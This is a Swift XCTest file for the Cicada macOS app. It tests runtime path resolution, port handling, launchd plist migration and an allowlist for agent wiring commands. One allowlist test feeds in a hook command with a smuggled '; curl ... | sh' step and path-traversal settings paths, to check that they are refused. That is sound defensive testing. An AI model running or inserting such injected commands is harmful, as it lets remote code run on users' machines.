import XCTest
@testable import CicadaApp

/// G182 — one runtime decides every path and command shape: a developer build exactly as before, a release build
/// through `~/.cicada/bin`'s launchers. Every input is injected; nothing here reads the real Bundle, home or launchd.
final class CicadaRuntimeTests: XCTestCase {
    static let bundle = "/Applications/Cicada.app"
    static let home = URL(fileURLWithPath: "/Users/x")

    /// A release runtime: the Info.plist key AND the bundled backend both present.
    static func release(bundle: String = bundle, environment: [String: String] = [:],
                        storedPort: Int = 0) -> CicadaRuntime {
        CicadaRuntime.resolve(
            infoValue: { $0 == CicadaRuntime.distributionInfoKey ? "release" : nil },
            bundlePath: bundle, environment: environment, storedPort: storedPort, homeDirectory: home,
            fileExists: { $0 == bundle + "/Contents/Resources/backend/bin/cicada-backend" })
    }

    // MARK: - Which build

    func testReleaseNeedsTheKeyAndTheBundledBackend() {
        XCTAssertEqual(Self.release().distribution, .release)
        let keyOnly = CicadaRuntime.resolve(
            infoValue: { $0 == CicadaRuntime.distributionInfoKey ? "release" : nil }, bundlePath: Self.bundle,
            environment: [:], storedPort: 0, homeDirectory: Self.home, fileExists: { _ in false })
        XCTAssertEqual(keyOnly.distribution, .developer, "a stamped bundle with no backend inside is not a release")
        let backendOnly = CicadaRuntime.resolve(
            infoValue: { _ in nil }, bundlePath: Self.bundle, environment: [:], storedPort: 0,
            homeDirectory: Self.home, fileExists: { _ in true })
        XCTAssertEqual(backendOnly.distribution, .developer)
        let otherValue = CicadaRuntime.resolve(
            infoValue: { $0 == CicadaRuntime.distributionInfoKey ? "Release" : nil }, bundlePath: Self.bundle,
            environment: [:], storedPort: 0, homeDirectory: Self.home, fileExists: { _ in true })
        XCTAssertEqual(otherValue.distribution, .developer, "exactly `release`")
    }

    func testADeveloperBuildKeepsTheG88LadderAndTodaysShapes() {
        let runtime = CicadaRuntime.resolve(
            infoValue: { $0 == "CicadaRepoRoot" ? "/R/cicada" : nil },
            bundlePath: "/Users/x/Applications/Cicada.app", environment: [:], storedPort: 0,
            homeDirectory: Self.home, fileExists: { $0 == "/R/cicada" })
        XCTAssertEqual(runtime.distribution, .developer)
        XCTAssertEqual(runtime.codeRoot.path, "/R/cicada")
        XCTAssertEqual(runtime.memoryRootDefault, "/R/cicada/memory")
        XCTAssertEqual(runtime.pythonPath, "/R/cicada/api/.venv/bin/python")
        XCTAssertEqual(runtime.mcpCommand.command, "/R/cicada/api/.venv/bin/python")
        XCTAssertEqual(runtime.mcpCommand.args, ["/R/cicada/mcp/server.py"])
        XCTAssertEqual(runtime.registryArgv, ["/R/cicada/api/.venv/bin/python", "/R/cicada/api/hooks/registry.py"])
        XCTAssertEqual(runtime.hookCommand(kind: "capture", harness: "claude-code"),
                       "\"/R/cicada/api/.venv/bin/python\" \"/R/cicada/api/hooks/capture.py\" --harness claude-code")
        XCTAssertEqual(runtime.hookCommand(kind: "recall", harness: "codex"),
                       "\"/R/cicada/api/.venv/bin/python\" \"/R/cicada/api/hooks/recall.py\" --harness codex")
        XCTAssertEqual(runtime.backendSpawn.executable.path, "/R/cicada/api/.venv/bin/python")
        XCTAssertEqual(runtime.backendSpawn.arguments,
                       ["-m", "uvicorn", "api.main:app", "--host", "127.0.0.1", "--port", "8000"])
        XCTAssertNil(runtime.bundledGit, "a developer build never runs the bundled git")
        XCTAssertEqual(runtime.cicadaHome.path, "/Users/x/.cicada")
    }

    func testAReleaseRunsTheLaunchersAndNamesNothingInsideTheBundle() {
        let runtime = Self.release()
        XCTAssertEqual(runtime.codeRoot.path, "/Applications/Cicada.app/Contents/Resources/backend/app")
        XCTAssertEqual(runtime.binDir.path, "/Users/x/.cicada/bin")
        XCTAssertEqual(runtime.pythonPath, "/Users/x/.cicada/bin/cicada-python")
        XCTAssertEqual(runtime.mcpCommand.command, "/Users/x/.cicada/bin/cicada-mcp")
        XCTAssertEqual(runtime.mcpCommand.args, [])
        XCTAssertEqual(runtime.registryArgv, ["/Users/x/.cicada/bin/cicada-hook", "registry"])
        XCTAssertEqual(runtime.hookCommand(kind: "capture", harness: "claude-code"),
                       "\"/Users/x/.cicada/bin/cicada-hook\" capture --harness claude-code")
        XCTAssertEqual(runtime.hookCommand(kind: "recall", harness: "codex"),
                       "\"/Users/x/.cicada/bin/cicada-hook\" recall --harness codex")
        XCTAssertEqual(runtime.backendSpawn.executable.path, "/Users/x/.cicada/bin/cicada-backend")
        XCTAssertEqual(runtime.backendSpawn.arguments, [], "the port rides CICADA_PORT, not argv")
        XCTAssertEqual(runtime.bundledGit, "/Applications/Cicada.app/Contents/Resources/backend/bin/git")
        XCTAssertEqual(runtime.logDir.path, "/Users/x/.cicada/logs")
    }

    func testCicadaHomeComesFromTheEnvironmentFirst() {
        XCTAssertEqual(Self.release(environment: ["CICADA_HOME": "/tmp/ch"]).binDir.path, "/tmp/ch/bin")
        XCTAssertEqual(Self.release(environment: ["CICADA_HOME": ""]).binDir.path, "/Users/x/.cicada/bin")
    }

    // MARK: - Memory

    func testAReleasesMemoryIsTheBackendsDefaultNeverTheBundle() {
        XCTAssertEqual(Self.release().memoryRootDefault, "/Users/x/cicada/memory")
        XCTAssertEqual(Self.release(environment: ["CICADA_MEMORY_PATH": "/data/bank"]).memoryRootDefault, "/data/bank")
        XCTAssertEqual(Self.release(environment: ["CICADA_MEMORY_PATH": Self.bundle + "/Contents/Resources/memory"])
            .memoryRootDefault, "/Users/x/cicada/memory", "an update replaces the bundle; a bank never lives there")
        XCTAssertEqual(Self.release(environment: ["CICADA_MEMORY_PATH": Self.bundle]).memoryRootDefault,
                       "/Users/x/cicada/memory")
        XCTAssertFalse(Self.release().memoryRootDefault.hasPrefix(Self.bundle))
    }

    // MARK: - Port

    func testThePortIsTheEnvironmentThenTheDefaultThen8000() {
        XCTAssertEqual(CicadaRuntime.port(environment: [:], stored: 0), 8000)
        XCTAssertEqual(CicadaRuntime.port(environment: ["CICADA_PORT": "8123"], stored: 9000), 8123)
        XCTAssertEqual(CicadaRuntime.port(environment: [:], stored: 9000), 9000)
        XCTAssertEqual(CicadaRuntime.port(environment: ["CICADA_PORT": " 8124 "], stored: 0), 8124)
        for bad in ["0", "65536", "-1", "abc", "", "80.5"] {
            XCTAssertEqual(CicadaRuntime.port(environment: ["CICADA_PORT": bad], stored: 0), 8000, bad)
            XCTAssertEqual(CicadaRuntime.port(environment: ["CICADA_PORT": bad], stored: 9001), 9001, bad)
        }
        XCTAssertEqual(CicadaRuntime.port(environment: [:], stored: 70000), 8000)
        XCTAssertEqual(CicadaRuntime.port(environment: [:], stored: -5), 8000)
        XCTAssertEqual(CicadaRuntime.port(environment: ["CICADA_PORT": "65535"], stored: 0), 65535)
    }

    func testThePortReachesTheURLAndTheDeveloperSpawn() {
        let runtime = CicadaRuntime.resolve(
            infoValue: { $0 == "CicadaRepoRoot" ? "/R/cicada" : nil }, bundlePath: "/x/Cicada.app",
            environment: ["CICADA_PORT": "8765"], storedPort: 0, homeDirectory: Self.home, fileExists: { _ in true })
        XCTAssertEqual(runtime.backendURL, "http://127.0.0.1:8765")
        XCTAssertEqual(runtime.backendSpawn.arguments.suffix(2), ["--port", "8765"])
        XCTAssertEqual(Self.release(storedPort: 9100).backendURL, "http://127.0.0.1:9100")
    }

    // MARK: - The backend child

    func testAReleasesBackendChildGetsMemoryPortAndHomeButNoPythonPath() {
        let runtime = Self.release(environment: ["CICADA_HOME": "/tmp/ch", "CICADA_PORT": "8200"])
        let env = BackendProcess.releaseEnvironment(base: ["PYTHONPATH": "/R", "HOME": "/Users/x"], runtime: runtime)
        XCTAssertNil(env["PYTHONPATH"])
        XCTAssertEqual(env["CICADA_MEMORY_PATH"], "/Users/x/cicada/memory")
        XCTAssertEqual(env["CICADA_PORT"], "8200")
        XCTAssertEqual(env["CICADA_HOME"], "/tmp/ch")
        XCTAssertEqual(env["HOME"], "/Users/x")
    }

    func testTheBackendLogIsAppendedUnderCicadasHome() throws {
        let dir = FileManager.default.temporaryDirectory.appendingPathComponent("runtime-\(UUID())/logs")
        defer { try? FileManager.default.removeItem(at: dir.deletingLastPathComponent()) }
        let first = try XCTUnwrap(BackendProcess.logHandle(in: dir))
        first.write(Data("one\n".utf8))
        try first.close()
        let second = try XCTUnwrap(BackendProcess.logHandle(in: dir))
        second.write(Data("two\n".utf8))
        try second.close()
        XCTAssertEqual(try String(contentsOf: dir.appendingPathComponent("backend.log"), encoding: .utf8), "one\ntwo\n")
        XCTAssertNil(BackendProcess.logHandle(in: URL(fileURLWithPath: "/dev/null/logs")), "an error is nil, never a throw")
    }

    // MARK: - Agent wiring allowlist (item 6)

    private let claude = "/opt/bin/claude"
    private let codex = "/opt/bin/codex"
    private let settings = "/Users/x/.claude/settings.json"

    private func mcp(_ runtime: CicadaRuntime, bin: String? = nil, extra: [String] = []) -> [String] {
        [bin ?? claude, "mcp", "add", "cicada", "--scope", "user", "--env", "CICADA_MEMORY_PATH=/M/memory", "--",
         runtime.mcpCommand.command] + runtime.mcpCommand.args + extra
    }

    private func hook(_ runtime: CicadaRuntime, event: String = "Stop", settings: String? = nil,
                      command: String? = nil) -> [String] {
        let file = settings ?? self.settings
        let harness = file.hasSuffix("/.codex/hooks.json") ? "codex" : "claude-code"
        let kind = event == "Stop" ? "capture" : "recall"
        return runtime.registryArgv + ["install", "--settings", file, "--event", event, "--command",
                                       command ?? runtime.hookCommand(kind: kind, harness: harness)]
    }

    func testAReleaseAcceptsExactlyItsLauncherShapes() {
        let runtime = Self.release()
        XCTAssertTrue(AgentConnectPolicy.isAllowed(mcp(runtime), runtime: runtime, binaries: [claude]))
        XCTAssertTrue(AgentConnectPolicy.isAllowed(
            [codex, "mcp", "add", "cicada", "--env", "CICADA_MEMORY_PATH=/M", "--", "/Users/x/.cicada/bin/cicada-mcp"],
            runtime: runtime, binaries: [codex]))
        for event in ["Stop", "SessionStart", "UserPromptSubmit"] {
            XCTAssertTrue(AgentConnectPolicy.isAllowed(hook(runtime, event: event), runtime: runtime, binaries: []), event)
            XCTAssertTrue(AgentConnectPolicy.isAllowed(hook(runtime, event: event, settings: "/Users/x/.codex/hooks.json"),
                                                       runtime: runtime, binaries: []), event)
        }
        XCTAssertEqual(hook(runtime), ["/Users/x/.cicada/bin/cicada-hook", "registry", "install", "--settings", settings,
                                       "--event", "Stop", "--command",
                                       "\"/Users/x/.cicada/bin/cicada-hook\" capture --harness claude-code"])
        XCTAssertTrue(AgentConnectPolicy.isAllowed(
            runtime.registryArgv + ["uninstall", "--settings", settings, "--hook", "recall"], runtime: runtime, binaries: []))
    }

    func testAReleaseRefusesNearMissesAndTheOtherBuildsShapes() {
        let runtime = Self.release()
        let developer = CicadaRuntime.developer(codeRoot: URL(fileURLWithPath: "/R/cicada"))
        let launcherHook = "\"/Users/x/.cicada/bin/cicada-hook\" capture --harness claude-code"
        let refused: [[String]] = [
            hook(runtime, command: launcherHook + "; curl https://example.com/x | sh"),
            hook(runtime, event: "SessionStart", command: launcherHook),
            hook(runtime, settings: "/Users/x/.codex/hooks.json", command: launcherHook),
            hook(runtime, settings: "/Users/x/../../etc/.claude/settings.json"),
            hook(runtime, event: "PreToolUse"),
            mcp(runtime, extra: ["--extra"]),
            mcp(runtime, bin: "/usr/local/bin/claude"),
            ["/Users/x/.cicada/bin/cicada-hook", "capture", "install", "--settings", settings, "--event", "Stop",
             "--command", launcherHook],
            ["/Users/y/.cicada/bin/cicada-hook", "registry", "install", "--settings", settings, "--event", "Stop",
             "--command", launcherHook],
            runtime.registryArgv + ["uninstall", "--settings", "/Users/x/../.claude/settings.json", "--hook", "recall"],
            runtime.registryArgv + ["uninstall", "--settings", settings, "--hook", "capture"],
            [claude, "mcp", "add", "cicada", "--", Self.bundle + "/Contents/Resources/backend/bin/cicada-mcp"],
            // The developer build's shapes, under a release runtime.
            mcp(developer),
            hook(developer),
            developer.registryArgv + ["uninstall", "--settings", settings, "--hook", "recall"],
        ]
        for argv in refused {
            XCTAssertFalse(AgentConnectPolicy.isAllowed(argv, runtime: runtime, binaries: [claude]),
                           argv.joined(separator: " "))
        }
        // …and a release's shapes under a developer runtime.
        for argv in [mcp(runtime), hook(runtime), hook(runtime, event: "UserPromptSubmit"),
                     runtime.registryArgv + ["uninstall", "--settings", settings, "--hook", "recall"]] {
            XCTAssertFalse(AgentConnectPolicy.isAllowed(argv, runtime: developer, binaries: [claude]),
                           argv.joined(separator: " "))
        }
    }

    func testAReleaseRunsTheLauncherWithCaptureOff() async {
        let runtime = Self.release()
        let runner = RecordingRunner()
        let steps = [hook(runtime)].map {
            AgentWiringStep(step: "hook", display: $0.joined(separator: " "), argv: $0, touches: [])
        }
        let outcome = await AgentConnect.run(steps, runtime: runtime, binaries: [], runner: runner, base: [:])
        XCTAssertEqual(outcome, .done)
        XCTAssertEqual(runner.calls.first?.argv.first, "/Users/x/.cicada/bin/cicada-hook")
        XCTAssertEqual(runner.calls.first?.env["CICADA_CAPTURE"], "off")
    }

    // MARK: - Copy-paste snippets (item 7)

    func testAReleasesSnippetsCarryTheLauncherAndNoArgs() throws {
        let runtime = Self.release()
        let agents = AgentSetupCatalog.all(runtime: runtime)
        let code = try XCTUnwrap(agents.first { $0.id == "claude-code" }?.steps.first?.command)
        XCTAssertEqual(code, "claude mcp add cicada --scope user --env CICADA_MEMORY_PATH=/Users/x/cicada/memory -- "
                       + "/Users/x/.cicada/bin/cicada-mcp")
        let codexCLI = try XCTUnwrap(agents.first { $0.id == "codex" }?.steps.first?.command)
        XCTAssertTrue(codexCLI.hasSuffix("-- \"/Users/x/.cicada/bin/cicada-mcp\""), codexCLI)
        let toml = try XCTUnwrap(agents.first { $0.id == "codex" }?.steps.last?.command)
        XCTAssertTrue(toml.contains("args = []"), toml)
        let desktop = try XCTUnwrap(agents.first { $0.id == "claude-desktop" }?.steps.first?.command)
        XCTAssertTrue(desktop.contains("\"args\": []"), desktop)
        for agent in agents {
            for step in agent.steps {
                let command = step.command ?? ""
                XCTAssertFalse(command.contains(".venv"), "\(agent.id): \(command)")
                XCTAssertFalse(command.contains("Cicada.app"), "\(agent.id): \(command)")
                XCTAssertFalse(command.contains("server.py"), "\(agent.id): \(command)")
            }
        }
        // Cursor's deep link is the inner server object, base64.
        let link = try XCTUnwrap(agents.first { $0.id == "cursor" }?.deeplink?.url)
        let config = try XCTUnwrap(URLComponents(url: link, resolvingAgainstBaseURL: false)?
            .queryItems?.first { $0.name == "config" }?.value)
        let inner = try XCTUnwrap(Data(base64Encoded: config))
        let object = try XCTUnwrap(JSONSerialization.jsonObject(with: inner) as? [String: Any])
        XCTAssertEqual(object["command"] as? String, "/Users/x/.cicada/bin/cicada-mcp")
        XCTAssertEqual((object["args"] as? [String]), [])
        XCTAssertEqual((object["env"] as? [String: String])?["CICADA_MEMORY_PATH"], "/Users/x/cicada/memory")
    }

    func testTheLiveMemoryRootStillWinsInARelease() throws {
        let agents = AgentSetupCatalog.all(runtime: Self.release(), memoryRoot: "/live/memory")
        let code = try XCTUnwrap(agents.first { $0.id == "claude-code" }?.steps.first?.command)
        XCTAssertTrue(code.contains("CICADA_MEMORY_PATH=/live/memory"), code)
    }

    func testADeveloperRuntimesSnippetsAreTodaysByteForByte() {
        let root = URL(fileURLWithPath: "/x/repo")
        let viaRuntime = AgentSetupCatalog.all(runtime: .developer(codeRoot: root), memoryRoot: "/m")
        let viaHome = AgentSetupCatalog.all(home: "/x/repo", memoryRoot: "/m")
        XCTAssertEqual(viaRuntime.map { $0.steps.map(\.command) }, viaHome.map { $0.steps.map(\.command) })
        XCTAssertEqual(viaRuntime.map(\.deeplink?.url), viaHome.map(\.deeplink?.url))
        let code = viaHome.first { $0.id == "claude-code" }?.steps.first?.command
        XCTAssertEqual(code, "claude mcp add cicada --scope user --env CICADA_MEMORY_PATH=/m -- "
                       + "/x/repo/api/.venv/bin/python /x/repo/mcp/server.py")
    }

    func testSetUpClaudeWritesTheRuntimesCommand() {
        let runtime = Self.release()
        let server = ClaudeDesktopConfig.server(command: runtime.mcpCommand.command, args: runtime.mcpCommand.args,
                                                memory: runtime.memoryRootDefault)
        XCTAssertEqual(server["command"] as? String, "/Users/x/.cicada/bin/cicada-mcp")
        XCTAssertEqual(server["args"] as? [String], [])
        XCTAssertTrue(NSDictionary(dictionary: ClaudeDesktopConfig.server(python: "/p", script: "/s", memory: "/m"))
            .isEqual(to: ClaudeDesktopConfig.server(command: "/p", args: ["/s"], memory: "/m")))
    }

    // MARK: - Git (item 9)

    func testTheBundledGitIsTheLastResortOnly() {
        let bundled = Self.release().bundledGit
        XCTAssertEqual(GitRunner.candidates(bundledGit: nil), GitRunner.candidates)
        XCTAssertEqual(GitRunner.candidates(bundledGit: bundled).last, bundled)
        XCTAssertFalse(GitRunner.candidates(bundledGit: bundled).contains("/usr/bin/git"))
        let all = Set(GitRunner.candidates(bundledGit: bundled))
        XCTAssertEqual(GitRunner.executable(bundledGit: bundled, isExecutable: { all.contains($0) }),
                       "/Library/Developer/CommandLineTools/usr/bin/git", "the person's own git first")
        XCTAssertEqual(GitRunner.executable(bundledGit: bundled, isExecutable: { $0 == bundled }), bundled)
        XCTAssertNil(GitRunner.executable(bundledGit: nil, isExecutable: { $0 == bundled }))
    }
}

/// G182 item 3 — the background service in a release: the same install argv against the bundled code root, the
/// launcher in the environment, and a one-time migration of a plist an older build wrote.
@MainActor
final class BackendAgentReleaseTests: XCTestCase {
    private let launcher = "/Users/x/.cicada/bin/cicada-backend"

    private func plist(_ program: [Any]?) -> Data {
        var object: [String: Any] = ["Label": "com.cicada.backend"]
        if let program { object["ProgramArguments"] = program }
        return try! PropertyListSerialization.data(fromPropertyList: object, format: .xml, options: 0)
    }

    func testNeedsMigration() {
        XCTAssertFalse(BackendAgentPolicy.needsMigration(plistData: nil, launcher: launcher), "no plist: stays opt-in")
        XCTAssertTrue(BackendAgentPolicy.needsMigration(
            plistData: plist(["/R/cicada/api/.venv/bin/python", "-m", "uvicorn", "api.main:app"]), launcher: launcher))
        XCTAssertTrue(BackendAgentPolicy.needsMigration(
            plistData: plist(["/Applications/Old.app/Contents/Resources/backend/bin/cicada-backend"]), launcher: launcher))
        XCTAssertFalse(BackendAgentPolicy.needsMigration(plistData: plist([launcher]), launcher: launcher))
        XCTAssertFalse(BackendAgentPolicy.needsMigration(plistData: Data("not a plist".utf8), launcher: launcher))
        XCTAssertFalse(BackendAgentPolicy.needsMigration(plistData: plist(nil), launcher: launcher))
        XCTAssertFalse(BackendAgentPolicy.needsMigration(plistData: plist([]), launcher: launcher))
        XCTAssertFalse(BackendAgentPolicy.needsMigration(plistData: plist([42]), launcher: launcher))
    }

    func testAReleaseInstallPointsTheScriptAtTheLauncher() {
        let runtime = CicadaRuntimeTests.release(environment: ["CICADA_PORT": "8300"])
        XCTAssertEqual(BackendAgentPolicy.installArgv(installRoot: runtime.codeRoot),
                       ["/bin/bash", "/Applications/Cicada.app/Contents/Resources/backend/app/scripts/install-backend-agent.sh"])
        let env = BackendAgentPolicy.environment(base: ["ANTHROPIC_API_KEY": "k"], runtime: runtime, memoryRoot: "/m")
        XCTAssertEqual(env["CICADA_BACKEND_PROGRAM"], launcher)
        XCTAssertEqual(env["CICADA_LOG_DIR"], "/Users/x/.cicada/logs")
        XCTAssertEqual(env["CICADA_PORT"], "8300")
        XCTAssertEqual(env["CICADA_HOME"], "/Users/x/.cicada")
        XCTAssertEqual(env["CICADA_MEMORY_PATH"], "/m")
        XCTAssertEqual(env["CICADA_CAPTURE"], "off")
        XCTAssertNil(env["ANTHROPIC_API_KEY"])
        let developer = BackendAgentPolicy.environment(base: [:], runtime: .developer(codeRoot: URL(fileURLWithPath: "/R")),
                                                       memoryRoot: "/m")
        XCTAssertNil(developer["CICADA_BACKEND_PROGRAM"], "a developer build's plist stays the venv's")
        XCTAssertNil(developer["CICADA_PORT"])
    }

    private func service(_ runtime: CicadaRuntime, runner: FakeRunner, live: String? = nil) -> BackendAgentService {
        BackendAgentService(runner: runner, runtime: runtime,
                            plistURL: URL(fileURLWithPath: "/nonexistent/com.cicada.backend.plist"), uid: 501,
                            memoryRoot: { live }, envFileContents: { XCTFail("a release has no api/.env"); return nil },
                            onInstalled: {})
    }

    func testAnOldPlistIsMigratedOnceWithTheReleasesDefaultMemory() async {
        let runner = FakeRunner()
        let runtime = CicadaRuntimeTests.release()
        let agent = service(runtime, runner: runner)
        let ran = await agent.migrateIfNeeded(readPlist: { _ in self.plist(["/R/api/.venv/bin/python", "-m", "uvicorn"]) })
        XCTAssertTrue(ran)
        let install = runner.runs.first { $0.argv.first == "/bin/bash" }
        XCTAssertEqual(install?.argv, BackendAgentPolicy.installArgv(installRoot: runtime.codeRoot))
        XCTAssertEqual(install?.env["CICADA_BACKEND_PROGRAM"], launcher)
        XCTAssertEqual(install?.env["CICADA_MEMORY_PATH"], "/Users/x/cicada/memory")
    }

    func testTheLiveBackendsBankWinsDuringMigration() async {
        let runner = FakeRunner()
        let agent = service(CicadaRuntimeTests.release(), runner: runner, live: "/live/memory")
        await agent.migrateIfNeeded(readPlist: { _ in self.plist(["/R/api/.venv/bin/python"]) })
        XCTAssertEqual(runner.runs.first { $0.argv.first == "/bin/bash" }?.env["CICADA_MEMORY_PATH"], "/live/memory")
    }

    func testNoPlistACurrentPlistOrADeveloperBuildInstallsNothing() async {
        let runner = FakeRunner()
        let release = service(CicadaRuntimeTests.release(), runner: runner)
        let none = await release.migrateIfNeeded(readPlist: { _ in nil })
        let current = await release.migrateIfNeeded(readPlist: { _ in self.plist([self.launcher]) })
        let developer = BackendAgentService(runner: runner, runtime: .developer(codeRoot: URL(fileURLWithPath: "/R")),
                                            plistURL: URL(fileURLWithPath: "/nonexistent/agent.plist"), uid: 501,
                                            memoryRoot: { "/m" }, envFileContents: { nil }, onInstalled: {})
        let dev = await developer.migrateIfNeeded(readPlist: { _ in self.plist(["/R/api/.venv/bin/python"]) })
        XCTAssertFalse(none || current || dev)
        XCTAssertTrue(runner.runs.isEmpty, "nothing touches launchd")
    }
}
